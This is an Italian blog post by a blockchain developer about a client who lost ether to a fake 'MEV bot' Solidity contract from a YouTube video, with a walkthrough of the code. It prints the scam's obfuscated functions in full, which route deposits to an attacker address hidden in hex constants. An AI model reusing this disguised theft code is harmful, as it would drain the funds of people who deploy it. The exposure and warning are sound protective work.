---
date: '2024-01-31 12:40:00'
slug: 'the-fascinating-ethereum-mev-bot-scam'
title: "L'affascinante truffa dei Bot MEV su Ethereum"
subtitle: "Triste cronaca di una truffa avvenuta ad un cliente e analisi del codice"
author: 'veeso'
featuredImage: ./featured.jpeg
lang: it
---

## Cosa sono i Bot MEV

Per chi non lo sapesse, me incluso:

> Un bot MEV, che sta per "Valore Massimo Estrabile", è un programma avanzato che opera nel mondo delle criptovalute. Esso scandaglia la blockchain, che è come un registro digitale di tutte le transazioni crittografiche, cercando opportunità di profitto. Queste opportunità derivano da piccole differenze nei prezzi o dall'essere i primi a conoscere le transazioni in sospeso. Il bot agisce con estrema rapidità, spesso in millisecondi, per accaparrarsi queste occasioni prima di chiunque altro. È come avere un trader superveloce che non dorme mai, costantemente alla ricerca di modi per guadagnare essendo il più rapido e intelligente nel individuare e sfruttare queste opportunità fugaci.

## Cronaca di una truffa

È passato molto tempo dal mio ultimo psoto sul blog, ma ho avuto una buona opportunità per una storia da raccontare dopo quello che mi è successo giusto un paio di giorni fa.

![were-back](./were-back.gif)

Come forse già sai, mi occupo di diversi campi nell'ambito dello sviluppo software, ma in particolare mi occupo di sviluppo in ambito blockchain. Oltre ai progetti da aziende più grosse, ricevo anche molte richieste per implementare anche piccoli progetti su blockchain o anche per consulenza.

### Il contatto

Qualche giorno fa ho ricevuto una chiamata da una persona che in questa storia chiameremo **Omar**, che mi ha detto qualcosa del genere:

> Ciao Christian,
>
> Quindi io avrei questo codice di un MEV bot che è stato sviluppato per me da un collaboratore e funziona tutto correttamente. Io vedo effettivamente i fondi aumentare, ma quando vado a fare il prelievo qualcosa nel codice non funziona. Non è che riusciresti a darci un'occhiata e capire cos'ha che non va?

E qui voglio fare una premessa:

1. Io non avevo idea al momento di cosa fosse un **MEV bot**. Quindi non vi aspettiate che io potessi capire al volo che questa cosa fosse uno scam. Conosco Solidity e lavoro con gli smart contract Ethereum, ma non ho mai visto il codice di un MEV bot.
2. Se un cliente mi dice che ha del codice fatto per lui che funziona e mi dice c'è una parte che non funziona, non passo ore e ore a controllare tutto il codice, ma solo la parte che lui mi ha detto che funziona. In pratica mi fido di ciò che mi dice un cliente.
3. Non avevo motivo di pensare che questa cosa fosse uno scam. Se mi fosse stato detto "Mi ha scritto uno su telegram riguardo a questa possibilità di guadagno..." oppure "ho preso e copia-incollato questo codice da github..." allora mi sarebbe venuto il dubbio, ma ripeto: il cliente mi ha detto che era un codice fatto da un collaboratore.

Al che ho risposto:

> Okay, inviami il codice e ci do un'occhiata, poi ti farò sapere quanto viene per sistemarlo.

Quindi, mi manda il codice e comincio a guardarci dentro.

### Il codice

Erano le 6 di sera e ho cominciato subito a guardare nel codice.

Il codice consisteva in 477 linee di codice scritto in Solidity e all'interno conteneva delle funzioni apparentemente complesse che facevano qualcosa con delle mempool, ma non mi interessavano particolarmente. Omar mi ha detto che il problema resideva nella funziona `Withdrawal`, quindi mi sono precipitato alla sua definizione.

```sol
    /*
     * @dev withdrawals profit back to contract creator address
     * @return `profits`.
     */
    function Withdrawal() public payable { 
        emit Log("Sending profits back to contract creator address...");
        payable(WithdrawalProfits()).transfer(address(this).balance);
    }
```

La funzione non era affatto complessa ed il problema salta subito all'occhio. Questa funzione non invia il bilancio al contract owner, ma bensì ad un indirizzo tornato da `WithdrawalProfits()`, che tra l'altro tornava lo stesso indirizzo di quando si faceva il deposito.
Vedendo il corpo di `WithdrawalProfits()` ho pensato:

> Vabbè, errore di distrazione, strano certo, ma ci sono molti sviluppatori che fanno anche codice peggiore di questo.

Inoltre ripeto: **non avevo motivo di essere in malafede**.

Ho quindi deciso di aggiungere al contratto `Ownable` per aggiungere un proprietario in maniera sicura e ho cambiato la funzione per trasferire il bilancio all'owner del contratto, qualvolta la funzione venisse chiamata.

```sol
address payable ownerAddress = payable(Ownable.owner());
ownerAddress.transfer(address(this).balance);
```

Beh, facile no?

Non ho testato il resto del codice, ma quella parte sì e funzionava correttamente ora. Gli ethereum arrivavano sul mio wallet.

Il giorno seguente ci siamo quindi sentiti per fare un test in live insieme e fare il deploy della versione corretta.

### Il deploy che non c'è stato

Quindi il giorno dopo ci siamo sentiti per telefono e lui mi ha condiviso lo schermo, siamo subito andati su Remix e ho importato il miio codice.

Gli ho spiegato dove stava il problema e la modifica che avevo fatto e gli ho detto che avremmo dovuto procedere al deploy del nuovo contratto, al che lui mi ha risposto **che non fosse necessario, ma che bastava caricarlo sul contratto già esistente**.

La cosa mi sembrava molto strana. Chiunque abbia mai lavorato con Ethereum sa benissimo che il codice su Ethereum è **immutabile**, ovvero non vi è modo di aggiornare uno smart-contract. Se si vuole cambiare il codice si deve fare un nuovo deploy, e al limite, cambiare i riferimenti delle applicazioni che lo usano per puntare al nuovo contratto.

Ho quindi cominciato a pensare che Omar non fosse quindi affatto esperto di Ethereum e che forse stava un po' improvvisando con quel codice.

Ma ci poteva pure stare, dopotutto non l'aveva scritto lui, ma qualcuno per lui. Quindi, cosa poteva andare storto?

![what-could-possibly-go-wrong](./what-could-possibly-go-wrong.gif)

Ho quindi proseguito spiegando a Omar come funzionasse il deploy su Ethereum e lui mi ha risposto "Ok, non c'è problema, rifacciamo il deploy", ma quando ha visto la fee da pagare per il deploy ha cominciato ad essere riluttante. Erano 164$, tanti certo, ma data la dimensione del contratto mi sembrava normale.

Gli ho detto che quindi avremmo potuto guardare per farci un'idea quanto aveva pagato la volta scorsa, per la versione che non funzionava.

Mi passa quindi gli indirizzi del contratto e vado indietro nella history a cercare la transazione di `Contract creation` per vedere la fee, ma non la trovo. Strano, inoltre lui mi disse che era stato creato 13 giorni prima, ma la prima transazione era di 6 mesi fa.

### A quel punto ho cominciato ad avere qualche dubbio

Ero convinto che ci fosse qualcosa che non andava, ma soprattutto che Omar non avesse idea di come funzionasse il tutto.

Ho quindi controllato meglio su Etherscan e ho notato che non si trattava affatto dell'indirizzo di uno **smart contract**, ma bensì di un **wallet**.

![i-knew](./i-knew-it.gif)

E so cosa potreste pensare adesso

> ma veeso, come non te ne sei accorto prima che era uno giga scam?

Ripeto, non avevo motivo di pensarlo. Il codice a detta sua era stato fatto per lui da un collaboratore. Chi mai trufferebbe sé stesso?

Inoltre è nella nostra indole, che se diamo una cosa per certa, non sospetteremo mai che essa non sia così (c'è proprio un principio dietro a questa cosa, si chiama **confirmation bias**).

> **Confirmation bias**: Favorire informazioni che confermano credenze preesistenti.

Alla fine ero quindi riuscito a trovare l'indirizzo del contratto e ho, ahimé, potuto constatare che il balance del contract era zero. Cosa significa? Significa che non c'era nulla da prelevare.

Il bilancio dello smart-contract era cambiato solo in due occasioni infatti, quando lui aveva depositato gli Ether, chiamando la funzione `Start` e quando li aveva prelevati (beh, prelevati sì, anche se proprio non verso il suo wallet) chiamando `Withdrawal`

Il famoso bilancio che lui vedeva non era altro se non il bilancio di un altro wallet e non del suo contratto, dal quale lui avrebbe dovuto prelevare i suoi ether guadagnati.

Ma chi era questo indirizzo che riceveva i suoi Ether?

A questo punto avevo il dubbio che Omar non mi avesse proprio detto tutto e anche lui ha cominciato a percepire il mio temperamento, quindi non ho potuto fare a meno di chiedergli

> Potrei chiederti, se per te non è un problema, da dove viene fuori questo codice?

E dopo un giro di parole, arriva quasi con vergogna la risposta:

> Da un video su YouTube.

Giusto per la cronaca, il video in questione si chiama `How to make $1000 with web3`, che direi parli da sè.

Il tipo nel video ci mette pure la faccia, anche se dubito sia autentica, probabilmente si tratta solo di un video modificato. Anche perché il resto del canale ha dentro roba del tipo `learn css in 12 minutes` o `learn PHP in 15 minutes`, dove tipo senza audio mostra come fare `echo` in un file HTML.

![quality-content](./quality-content.gif)

A questo punto non potevo più fare molto, se non dire a Omar la verità. Era stato truffato e tutti i suoi fondi erano stati inviati verso un altro indirizzo Ethereum e non c'era modo di recuperarli.

![it-was-over](./it-was-over.gif)

Onestamente, mi sono sentito abbastanza male e pure in colpa.
Mi ha fatto male perché per quel giorno il mio lavoro è stato farmi pagare per una consulenza fatta a qualcuno a cui dovevo dire che era stato truffato.

Mi ha fatto male pensare a quanti soldi la gente perde credendo a queste opportunità.

Mi fa tristezza anche il ruolo di omertà che hanno le piattaforme dove vengono esposti questi metodi. YouTube ti blocca un video se non censuri la parola *omicidio*, però i video di scam non li guardano neanche.

So che con molta probabilità il mio audience è composto da persone con competenze tecniche sopra dal copy-paste, però se un tuo conoscente o familiare entra in contatto con queste opportunità, per favore fagli presente che

1. al 99% sono scam
2. se proprio vogliono provarci, almeno che contattino uno sviluppatore con competenza in blockchain per far controllare il codice sorgente del contratto. Un controllo costa pochissimo e può veramente salvargli i risparmi. Il bello della blockchain sta proprio nel fatto che non c'è modo di offuscare il codice.

## Ma siamo qui per la scienza

Dopo i dicorsi tristi, so che volete la ciccia, so che siete qui per vedere come funzionava questo fantomatico Bot.

Potreste aspettarvi che il contract inviasse semplicemente gli ether ad un hard-coded address nel codice, ma non è così semplice in realtà, anzi è molto ingegnoso, seppur malvagio certo.

Tanto per la cronaca non sono il primo a portare questi contenuti, qualcosa di molto simile l'ha già fatto Tech Addict sul [suo canale Youtube](https://www.youtube.com/watch?v=ZRzzLAMblOA), seppur con una versione del codice un po' diversa.

"Un po' diversa"? Certo, perché questa truffa gira da almeno inizio 2023, solo che il codice cambia ogni volta, diventando ogni volta più ingengnoso e aggiungendo marchingegni penosi per offuscare quello che fa veramente.

![here-for-the-science](./for-the-science.gif)

Il contratto comincia con un import di codice da Uniswap, che magari potrebbe farvi pensare che fa veramente qualcosa a livello di MEV, ma in realtà no. Importa del codice da Uniswap e lo lascia lì, dimenticato. Non serve assolutamente a nulla.

```sol
pragma solidity ^0.6.12;



import "https://github.com/Uniswap/v3-core/blob/main/contracts/interfaces/IUniswapV3Factory.sol";
import "https://github.com/Uniswap/v3-core/blob/main/contracts/interfaces/IUniswapV3Pool.sol";
import "https://github.com/Uniswap/v3-core/blob/main/contracts/libraries/LiquidityMath.sol";
```

Il costruttore prende due argomenti, che sono `Network` e `routerAddress`, ma indovinate un po'? Non servono a nulla.

```sol
constructor(string memory Network, string memory routerAddress) public {
        
        /*ETH
        /*The Uniswap V2 router address :  0x7a250d5630B4cF539739dF2C5dAcb4c659F2488D
     
        
        /BSC
        /Pancakeswap router address :      0x10ED43C718714eb63d5aA57B78B54704E256024E

        /Network: ETH or BSC
        */

        _Network = Network;
        _RouterAddress = routerAddress;
    }
```

Poi, si chiede all'utente di eseguire `Start`

```sol
    /*
     * @dev Perform frontrun action from different contract pools
     * @param contract address to snipe liquidity from
     * @return `liquidity`.
     */
    function Start() public payable {
        emit Log("Running MEV action. This can take a while; please wait..");
        payable(_callMEVAction()).transfer(address(this).balance);
    }
```

Che secondo la documentazione `Perform frontrun action from different contract pools`. In realtà non sembra sia così. Semplicemente riceve gli Ethers passati dal chiamante e li invia ad un indirizzo tornato da `_callMEVAction()`, che presto passerà al centro della scammata.

Uno semplicemente vedendo questa parte potrebbe pensare che sia immediato pensare che sia uno scam, ma vi posso garantire che non è così.

Sempre per il confirmation bias, mi veniva naturale pensare

> Okay, magari invia gli ether ad un altro contratto che si calcola in qualche modo e uno di questi contratti fa poi partire un worker che ascolta per gli invii di ether, fa qualcosa con questi ether e poi li rimanda indietro.
> Certo il codice è scritto male e la documentazione sembra casuale, ma magari è tutto una pezza scritta da qualcuno che non aveva voglia di aggiornare la documentazione e quindi magari l'ha semplicemente copiata da qualche altra funzione.

Quindi credetemi, non era assurda come idea, anche perché un bot non può funzionare su Ethereum. Ethereum non consente l'esecuzione di task in background, ma magari un worker su un'altra chain o off-chain sì. Quindi ripeto, non era così impensabile come soluzione.

Ad essere onesti, era forse la funzione che fermava il bot ad essere strana.

```sol
function Stop() public payable { 
  Log("Stopping contract bot...");
}
```

Già. Non fa nulla. Ma perché dovrebbe dopo tutto? Una volta prelevati gli ethers, mica serve stoppare il contratto. Magari era un refuso. Una volta faceva qualcosa e ora non più. Ripeto: **non era così assurdo**.

Ed infine, il colpo di grazia ai tuoi fondi, la funzione `Withdrawal`

```sol
    /*
     * @dev withdrawals profit back to contract creator address
     * @return `profits`.
     */
    function Withdrawal() public payable { 
        emit Log("Sending profits back to contract creator address...");
        payable(WithdrawalProfits()).transfer(address(this).balance);
    }
```

Abbiamo già visto in precedenza che questa funzione era sbagliata. Invece di mandare i fondi all'owner, li inviava a `WithdrawalProfits()`, che non tornava l'indirizzo dell'owner, ma qualcosa di apparentemente complesso.

E questo è tutto. Almeno per le chiamate esposte all'utente.

Ma quindi? A chi invia gli ethereum depositati?

Andiamo a vedere cosa fanno `WithdrawalProfits` e `_callMEVAction`:

```sol
    function WithdrawalProfits() internal pure returns (address) {
        return parseMempool(callMempool());
    }

    function _callMEVAction() internal pure returns (address) {
        return parseMempool(callMempool());
    }
```

Tornano un indirizzo, ma ciò che fa già un po' più paura, è che fanno la stessa cosa, pur avendo nomi diversi.

![suspicious](./suspicious.gif)

Però chiamano a catena `parseMempool` e `callMempool`, vediamole quindi:

```sol
    /*
     * @dev Parsing all Uniswap mempool
     * @param self The contract to operate on.
     * @return True if the slice is empty, False otherwise.
     */
    function parseMempool(string memory _a) internal pure returns (address _parsed) {
        bytes memory tmp = bytes(_a);
        uint160 iaddr = 0;
        uint160 b1;
        uint160 b2;

        for (uint i = 2; i < 2 + 2 * 20; i += 2) {
            iaddr *= 256;
            b1 = uint160(uint8(tmp[i]));
            b2 = uint160(uint8(tmp[i + 1]));
            if ((b1 >= 97) && (b1 <= 102)) {
                b1 -= 87;
            } else if ((b1 >= 65) && (b1 <= 70)) {
                b1 -= 55;
            } else if ((b1 >= 48) && (b1 <= 57)) {
                b1 -= 48;
            }
            if ((b2 >= 97) && (b2 <= 102)) {
                b2 -= 87;
            } else if ((b2 >= 65) && (b2 <= 70)) {
                b2 -= 55;
            } else if ((b2 >= 48) && (b2 <= 57)) {
                b2 -= 48;
            }
            iaddr += (b1 * 16 + b2);
        }
        return address(iaddr);
    }
```

`Parsing all Uniswap mempool`.

![i dont know rick](./rick.gif)

Sembra complesso, ma non lo è affatto. Per chi ha un po' di esperienza con le stringhe e occhio, avra già notato che questa funzione converte una stringa rappresentante valori esadecimali nel valore numerico corrispondente.

Cioè intendo dire, che se passi la stringa `"0xb90ab45828385996990e173e8541e0c93a8eae20"`, questa funzione semplicemente

1. Togliera `0x`
2. convertirà ogni coppia di caratteri nel valore esadecimale corrispondente

Ad esempio `"b9"` diventerà `0xb9` ecc, ritornando il tipo `address` da essa.

Ok, sicuramente un nome peculiare per questa funzione, ma comunque niente di troppo sospetto.

Riguardo a `callMempool()` invece...

```sol
    /*
     * @dev Iterating through all mempool to call the one with the with highest possible returns
     * @return `self`.
     */
    function callMempool() internal pure returns (string memory) {
        string memory _memPoolOffset = mempool("x", checkLiquidity(getMemPoolOffset()));
        uint _memPoolSol = 34273765033; //mempool solidity update
        uint _memPoolLength = 182132094; //lenght update
        uint _memPoolSize = 4038354462; //size update
        uint _memPoolHeight = getMemPoolHeight();
        uint _memPoolDepth = getMemPoolDepth();

        string memory _memPool1 = mempool(_memPoolOffset, checkLiquidity(_memPoolSol));
        string memory _memPool2 = mempool(checkLiquidity(_memPoolLength), checkLiquidity(_memPoolSize));
        string memory _memPool3 = checkLiquidity(_memPoolHeight);
        string memory _memPool4 = checkLiquidity(_memPoolDepth);

        string memory _allMempools = mempool(mempool(_memPool1, _memPool2), mempool(_memPool3, _memPool4));
        string memory _fullMempool = mempool("0", _allMempools);

        return _fullMempool;
    }
```

Questa è già più complicata, o meglio, in realtà è semplice, ma difficile da leggere.

Per prima cosa vediamo un uso ripetuto di `checkLiquidity`, che è implementata così:

```sol
/*
     * @dev Check if contract has enough liquidity available
     * @param self The contract to operate on.
     * @return True if the slice starts with the provided text, false otherwise.
     */
    function checkLiquidity(uint a) internal pure returns (string memory) {

        uint count = 0;
        uint b = a;
        while (b != 0) {
            count++;
            b /= 16;
        }
        bytes memory res = new bytes(count);
        for (uint i=0; i<count; ++i) {
            b = a % 16;
            res[count - i - 1] = toHexDigit(uint8(b));
            a /= 16;
        }

        return string(res);
    }
```

La descrizione anche qui è strana: `Check if contract has enough liquidity available`.

![yeah-sure](./yeah-sure.gif)

In realtà semplicemente, dato un numero, ne torna la rappresentazione esadecimale, cioè tipo `10 => a`.

Poi abbiamo la funzione `mempool`

```sol
  /*
     * @dev loads all Uniswap/Pancakeswap with (RouterAddress) mempool into memory
     * @param token An output parameter to which the first token is written.
     * @return `mempool`.
     */
    function mempool(string memory _base, string memory _value) internal pure returns (string memory) {
        bytes memory _baseBytes = bytes(_base);
        bytes memory _valueBytes = bytes(_value);

        string memory _tmpValue = new string(_baseBytes.length + _valueBytes.length);
        bytes memory _newValue = bytes(_tmpValue);

        uint i;
        uint j;

        for(i=0; i<_baseBytes.length; i++) {
            _newValue[j++] = _baseBytes[i];
        }

        for(i=0; i<_valueBytes.length; i++) {
            _newValue[j++] = _valueBytes[i];
        }

        return string(_newValue);
    }
```

che dice `loads all Uniswap/Pancakeswap with (RouterAddress) mempool into memory`, ma in realtà semplicemente concatena due stringhe.

Ed infine abbiamo

```sol
function getMemPoolOffset() internal pure returns (uint) {
  return 16333329;
}

function getMemPoolHeight() internal pure returns (uint) {
  return 711911;
}

function getMemPoolDepth() internal pure returns (uint) {
  return 237486;
}
```

che non penso di dover spiegare.

Se ora riguardiamo la funzione iniziale, possiamo notare che fa tutt'altro rispetto a ciò che afferma di fare, inolte il risultato non cambia mai.

```sol
    /*
     * @dev Iterating through all mempool to call the one with the with highest possible returns
     * @return `self`.
     */
    function callMempool() internal pure returns (string memory) {
        string memory _memPoolOffset = mempool("x", checkLiquidity(getMemPoolOffset()));
        uint _memPoolSol = 34273765033; //mempool solidity update
        uint _memPoolLength = 182132094; //lenght update
        uint _memPoolSize = 4038354462; //size update
        uint _memPoolHeight = getMemPoolHeight();
        uint _memPoolDepth = getMemPoolDepth();

        string memory _memPool1 = mempool(_memPoolOffset, checkLiquidity(_memPoolSol));
        string memory _memPool2 = mempool(checkLiquidity(_memPoolLength), checkLiquidity(_memPoolSize));
        string memory _memPool3 = checkLiquidity(_memPoolHeight);
        string memory _memPool4 = checkLiquidity(_memPoolDepth);

        string memory _allMempools = mempool(mempool(_memPool1, _memPool2), mempool(_memPool3, _memPool4));
        string memory _fullMempool = mempool("0", _allMempools);

        return _fullMempool;
    }
```

Tra l'altro possiamo facilmente affermare che il risultato non cambia mai. Questo perché c'è il modificatore `pure`, che indica che la funzione non legge lo stato del contratto e non riceve nessun argomento.

Ora che sappiamo cosa ciascuna funzione interna fa, tutta questa funzione potremmo semplicemente riscriverla come:

```sol
function scammerAddress() internal pure returns (string memory) {
  string memory addr0 = concatStrings("x", hexRepr(16333329));

  string memory addr1 = concatStrings(addr0, hexRepr(34273765033));
  string memory addr2 = concatStrings(hexRepr(182132094), hexRepr(4038354462));
  string memory addr3 = hexRepr(711911); // it was mempool height return
  string memory addr4 = hexRepr(237486); // it was mempool depth return

  string memory addressString = concatStrings(concatStrings(addr1, addr2), concatStrings(addr3, addr4));
  string memory fullAddress = concatStrings("0", addressString);

  return fullAddress;
}
```

Quindi eseguendola riga per riga avremo:

1. `addr0=xF93A11`
2. `addr1=xF93A117FAE026A9`
3. `addr2=ADB1D7EF0B4661E`
4. `addr3=ADCE7`
5. `addr4=39FAE`
6. `addressString=xF93A117FAE026A9ADB1D7EF0B4661EADCE739FAE`

Con risultato finale uguale a `0xF93A117FAE026A9ADB1D7EF0B4661EADCE739FAE`.

E non dimentichiamoci la descrizione qui: `Iterating through all mempool to call the one with the with highest possible returns`.

Certo, confermo che è il maggiore possibile ritorno! Per gli scammer però.

Trovo sempre affascinante il codice scritto da scammer, ma molto poco nobile il loro fine.

![joe-nods](./joe-nods.gif)
